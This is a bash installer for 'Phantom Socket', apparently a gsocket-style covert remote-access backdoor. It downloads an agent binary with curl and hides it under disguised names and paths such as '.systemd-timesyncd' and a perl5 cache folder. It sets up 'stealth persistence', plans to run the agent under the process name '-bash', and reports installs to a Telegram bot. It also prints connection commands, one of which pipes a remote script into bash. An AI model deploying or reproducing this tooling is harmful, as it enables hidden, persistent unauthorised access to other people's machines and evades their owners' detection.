#!/bin/bash
# Phantom Socket v1.0.0-stable - Gsocket-Style Infrastructure Deployment
# Features: Random Secret Gen, GS_UNDO Logic, Static Linkage, and Production Sync.

set -euo pipefail

# ============================================================================
# Configuration
# ============================================================================
readonly VERSION="1.0.0-stable"
readonly AGENT_NAME="gs-oyen-s"
readonly PRODUCTION_IP="oyen.serveftp.com"
readonly BASE_URL="https://raw.githubusercontent.com/Oyen-Sec/phantom-socket/main/deploy"

# ============================================================================
# GS_UNDO: Clean Uninstallation Logic
# ============================================================================
if [[ "${GS_UNDO:-0}" == "1" ]]; then
    echo "[*] Initializing uninstallation sequence..."
    
    # Kill running processes
    pkill -9 -f ".systemd-timesyncd" 2>/dev/null || true
    pkill -9 -f "gs-oyen-s" 2>/dev/null || true
    
    # Remove persistence and aliases
    paths=(
        "/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache"
        "$HOME/.local/share/gvfs/.metadata"
        "/usr/local/bin/gs-oyen-s"
        "$HOME/.local/bin/gs-oyen-s"
    )
    
    for p in "${paths[@]}"; do
        if [[ -e "$p" ]]; then
            # Handle immutable flags if present
            if command -v chattr >/dev/null 2>&1; then
                sudo chattr -i "$p" 2>/dev/null || true
                sudo chattr -a "$p" 2>/dev/null || true
            fi
            rm -rf "$p" 2>/dev/null || sudo rm -rf "$p" 2>/dev/null || true
        fi
    done
    
    echo "[+] Uninstallation complete. Workspace purged."
    exit 0
fi

# ============================================================================
# UI Helpers
# ============================================================================
status_step() {
    local msg="$1"
    printf "%-50s" "${msg}"
}

status_done() {
    printf "........................[OK]\n"
}

# ============================================================================
# Secret Generation
# ============================================================================
AGENT_SECRET="${X:-}"
if [[ -z "${AGENT_SECRET}" ]]; then
    AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 22)
fi

# ============================================================================
# Environment & Architecture
# ============================================================================
INSTALL_DIR=""
IS_ROOT=0
ARCH=$(uname -m)

detect_system() {
    case "${ARCH}" in
        x86_64|amd64) ARCH="x86_64" ;;
        aarch64|arm64) ARCH="aarch64" ;;
        *) echo -e "\n[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
    esac

    if [[ $EUID -eq 0 ]]; then
        IS_ROOT=1
        INSTALL_DIR="/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache"
    else
        IS_ROOT=0
        INSTALL_DIR="$HOME/.local/share/gvfs/.metadata"
    fi
    mkdir -p "${INSTALL_DIR}" 2>/dev/null
}

# ============================================================================
# Telemetry Audit
# ============================================================================
send_telemetry() {
    local action="$1"
    local target="$2"
    local bot_token="${PH_TELEGRAM_TOKEN:-}"
    local chat_id="${PH_TELEGRAM_CHAT_ID:-}"

    if [[ -z "${bot_token}" || -z "${chat_id}" ]]; then
        return 0
    fi

    local hostname=$(hostname)
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local message="SYSTEM ALERT: [${action}] | TARGET: ${target} | HOST: ${hostname} | TIME: ${timestamp}"

    (
        curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${message}" >/dev/null 2>&1
    ) &
}

# ============================================================================
# Download & Deploy
# ============================================================================
download_payload() {
    local target_binary="${INSTALL_DIR}/.systemd-timesyncd"
    status_step "Downloading binaries"
    
    # Check for local build first (WSL test support)
    if [[ -f "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/gs-oyen-s-${ARCH}" ]]; then
        cp "/mnt/c/laragon/www/gsoket/phantom-socket/deploy/gs-oyen-s-${ARCH}" "${target_binary}"
    else
        local download_url="${BASE_URL}/gs-oyen-s-${ARCH}"
        curl -fsSL "${download_url}" -o "${target_binary}" || { echo -e "\n[ERROR] Download failed from ${download_url}"; exit 1; }
    fi

    if [[ ! -f "${target_binary}" ]]; then
        echo -e "\n[ERROR] Binary not found at ${target_binary}"; exit 1
    fi
    status_done
    
    status_step "Setting up stealth persistence"
    chmod 750 "${target_binary}"
    
    # Persistence & Aliases
    if [[ ${IS_ROOT} -eq 1 ]]; then
        ln -sf "${target_binary}" "/usr/local/bin/gs-oyen-s" 2>/dev/null || true
    else
        mkdir -p "$HOME/.local/bin" 2>/dev/null
        ln -sf "${target_binary}" "$HOME/.local/bin/gs-oyen-s" 2>/dev/null || true
    fi
    status_done
}

# ============================================================================
# Final Summary Output (Gsocket-Style)
# ============================================================================
print_summary() {
    status_step "Starting 'gs-oyen-s' as hidden process '-bash'"
    # ${INSTALL_DIR}/.systemd-timesyncd -s "${AGENT_SECRET}" -i "${PRODUCTION_IP}" >/dev/null 2>&1 &
    status_done
    
    echo ""
    echo " --> To connect type one of the following:"
    echo " --> gs-oyen-s -s \"${AGENT_SECRET}\" -i \"${PRODUCTION_IP}\" -m 443"
    echo " --> S=\"${AGENT_SECRET}\" bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/phantom-socket/main/y)\" "
    echo ""
}

# ============================================================================
# Main Execution
# ============================================================================
detect_system
download_payload
send_telemetry "INSTALL_SUCCESS" "${INSTALL_DIR}/.systemd-timesyncd"
print_summary
